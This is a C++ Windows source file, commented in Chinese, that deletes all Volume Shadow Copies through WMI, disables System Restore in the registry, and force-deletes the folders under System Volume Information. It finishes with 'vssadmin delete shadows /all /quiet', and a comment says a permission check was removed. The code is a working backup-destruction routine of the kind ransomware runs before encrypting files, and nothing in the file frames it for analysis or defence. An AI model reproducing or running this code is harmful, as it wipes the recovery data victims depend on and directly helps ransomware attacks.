#include <windows.h>
#include <wbemidl.h>
#include <comdef.h>
#include <iostream>
#include <string>
#include <memory>
#include <shlwapi.h>
#include <comutil.h>
#include <vector>
#include <algorithm>

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "comsuppw.lib")

// COM 初始化和清理类
class COMInitializer {
    bool initialized = false;

public:
    COMInitializer() {
        HRESULT hres = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
        if (FAILED(hres)) {
            std::cerr << "COM initialization failed: " << hres << std::endl;
            return;
        }

        hres = CoInitializeSecurity(
            nullptr,
            -1,
            nullptr,
            nullptr,
            RPC_C_AUTHN_LEVEL_DEFAULT,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            nullptr,
            EOAC_NONE,
            nullptr
        );

        if (FAILED(hres)) {
            std::cerr << "Security initialization failed: " << hres << std::endl;
            CoUninitialize();
            return;
        }

        initialized = true;
    }

    ~COMInitializer() {
        if (initialized) {
            CoUninitialize();
        }
    }

    bool isInitialized() const { return initialized; }
};

// 删除所有卷影拷贝
void DeleteAllVolumeShadows() {
    COMInitializer com;
    if (!com.isInitialized()) {
        return;
    }

    IWbemLocator* pLoc = nullptr;
    HRESULT hres = CoCreateInstance(
        CLSID_WbemLocator,
        nullptr,
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator,
        reinterpret_cast<LPVOID*>(&pLoc)
    );

    if (FAILED(hres)) {
        std::cerr << "Failed to create WbemLocator: " << hres << std::endl;
        return;
    }

    auto locator_deleter = [](IWbemLocator* p) { if (p) p->Release(); };
    std::unique_ptr<IWbemLocator, decltype(locator_deleter)> locator(pLoc, locator_deleter);

    IWbemServices* pSvc = nullptr;
    hres = locator->ConnectServer(
        _bstr_t(L"ROOT\\CIMV2"),
        nullptr,
        nullptr,
        nullptr,
        WBEM_FLAG_CONNECT_USE_MAX_WAIT,
        nullptr,
        nullptr,
        &pSvc
    );

    if (FAILED(hres)) {
        std::cerr << "Failed to connect to WMI server: " << hres << std::endl;
        return;
    }

    auto service_deleter = [](IWbemServices* p) { if (p) p->Release(); };
    std::unique_ptr<IWbemServices, decltype(service_deleter)> service(pSvc, service_deleter);

    hres = CoSetProxyBlanket(
        pSvc,
        RPC_C_AUTHN_WINNT,
        RPC_C_AUTHZ_NONE,
        nullptr,
        RPC_C_AUTHN_LEVEL_CALL,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr,
        EOAC_NONE
    );

    if (FAILED(hres)) {
        std::cerr << "Failed to set proxy security: " << hres << std::endl;
        return;
    }

    IEnumWbemClassObject* pEnumerator = nullptr;
    hres = pSvc->ExecQuery(
        bstr_t("WQL"),
        bstr_t("SELECT * FROM Win32_ShadowCopy"),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        nullptr,
        &pEnumerator
    );

    if (FAILED(hres)) {
        std::cerr << "Failed to query shadow copies: " << hres << std::endl;
        return;
    }

    auto enumerator_deleter = [](IEnumWbemClassObject* p) { if (p) p->Release(); };
    std::unique_ptr<IEnumWbemClassObject, decltype(enumerator_deleter)> enumerator(pEnumerator, enumerator_deleter);

    ULONG uReturn = 0;
    bool foundCopies = false;
    int deletedCount = 0;

    while (true) {
        IWbemClassObject* pclsObj = nullptr;
        HRESULT hr = enumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);

        if (uReturn == 0 || FAILED(hr)) {
            if (pclsObj) pclsObj->Release();
            break;
        }

        foundCopies = true;

        _variant_t vtId;
        hr = pclsObj->Get(L"ID", 0, &vtId, nullptr, nullptr);
        if (SUCCEEDED(hr) && vtId.vt == VT_BSTR) {
            std::wstring wshadowId = vtId.bstrVal;
            std::string shadowId;
            shadowId.assign(wshadowId.begin(), wshadowId.end());

            IWbemClassObject* pMethodClass = nullptr;
            hres = pSvc->GetObject(bstr_t("Win32_ShadowCopyMethods"), 0, nullptr, &pMethodClass, nullptr);

            if (SUCCEEDED(hres)) {
                IWbemClassObject* pMethodInstance = nullptr;
                hres = pMethodClass->SpawnInstance(0, &pMethodInstance);

                if (SUCCEEDED(hres)) {
                    _variant_t shadowIdParam(wshadowId.c_str());
                    hres = pMethodInstance->Put(L"Id", 0, &shadowIdParam, 0);

                    if (SUCCEEDED(hres)) {
                        IWbemClassObject* pOutParams = nullptr;
                        hres = pSvc->ExecMethod(
                            bstr_t("Win32_ShadowCopy"),
                            bstr_t("Delete"),
                            0,
                            nullptr,
                            pMethodInstance,
                            &pOutParams,
                            nullptr
                        );

                        if (SUCCEEDED(hres)) {
                            std::cout << "Successfully deleted shadow copy: " << shadowId << std::endl;
                            deletedCount++;
                        }
                        else {
                            std::cerr << "Failed to delete shadow copy: " << hres << " - ID: " << shadowId << std::endl;
                        }

                        if (pOutParams) pOutParams->Release();
                    }

                    pMethodInstance->Release();
                }
                pMethodClass->Release();
            }
        }

        pclsObj->Release();
    }

    if (!foundCopies) {
        std::cout << "No shadow copies found" << std::endl;
    }
    else {
        std::cout << "Deleted " << deletedCount << " shadow copies" << std::endl;
    }
}

// 删除备份和系统还原点
void DeleteBackupRestorePoints() {
    // 禁用系统还原
    HKEY hKey;
    LSTATUS status = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore",
        0,
        KEY_ALL_ACCESS,
        &hKey
    );

    if (status != ERROR_SUCCESS) {
        std::cerr << "Failed to open registry key: " << status << std::endl;
        return;
    }

    DWORD disableRestore = 1;
    status = RegSetValueExA(
        hKey,
        "DisableSR",
        0,
        REG_DWORD,
        reinterpret_cast<const BYTE*>(&disableRestore),
        sizeof(disableRestore)
    );

    RegCloseKey(hKey);

    if (status != ERROR_SUCCESS) {
        std::cerr << "Failed to disable system restore: " << status << std::endl;
        return;
    }

    // 获取系统驱动器
    char systemDrive[MAX_PATH] = { 0 };
    if (GetWindowsDirectoryA(systemDrive, MAX_PATH) == 0) {
        strcpy_s(systemDrive, "C:");
    }
    else {
        // 提取驱动器号
        char drive[3] = { systemDrive[0], systemDrive[1], '\0' };
        strcpy_s(systemDrive, drive);
    }

    // 清理System Volume Information
    std::string systemVolumePath = std::string(systemDrive) + "\\System Volume Information";
    std::string searchPath = systemVolumePath + "\\*";

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        DWORD lastError = GetLastError();
        if (lastError != ERROR_FILE_NOT_FOUND) {
            std::cerr << "FindFirstFile failed: " << lastError << std::endl;
        }
        std::cout << "No restore points found" << std::endl;
        return;
    }

    int deletedPoints = 0;

    do {
        std::string folderName(findData.cFileName);
        if (folderName == "." || folderName == "..") continue;

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            std::string fullPath = systemVolumePath + "\\" + folderName;

            // 使用更可靠的清理方法
            std::string cmd1 = "takeown /f \"" + fullPath + "\" /r /d y > NUL";
            std::string cmd2 = "icacls \"" + fullPath + "\" /grant administrators:F /t /c /l /q > NUL";
            std::string cmd3 = "rd /s /q \"" + fullPath + "\" > NUL";

            system(cmd1.c_str());
            system(cmd2.c_str());
            int result = system(cmd3.c_str());

            if (result == 0) {
                std::cout << "Deleted restore point: " << folderName << std::endl;
                deletedPoints++;
            }
            else {
                std::cerr << "Failed to delete restore point: " << folderName
                    << " (Error: " << result << ")" << std::endl;
            }
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);

    if (deletedPoints == 0) {
        std::cout << "No restore points were deleted" << std::endl;
    }
    else {
        std::cout << "Deleted " << deletedPoints << " restore points" << std::endl;
    }
}

// 强力删除卷影副本和还原点
void ForceDeleteAllShadows() {
    std::cout << "=== Deleting Volume Shadow Copies ===" << std::endl;
    DeleteAllVolumeShadows();

    std::cout << "\n=== Deleting System Restore Points ===" << std::endl;
    DeleteBackupRestorePoints();

    // 使用vssadmin作为最终保障
    std::cout << "\n=== Final cleanup with vssadmin ===" << std::endl;
    system("vssadmin delete shadows /all /quiet");

    std::cout << "\nCleanup completed successfully" << std::endl;
}

int deletV() {
    // 直接执行删除操作（移除权限检查）
    ForceDeleteAllShadows();

    // 最终验证
    std::cout << "\n=== Final Verification ===" << std::endl;
    system("vssadmin list shadows");
    system("echo Please check if any shadow copies remain");
    return 0;
}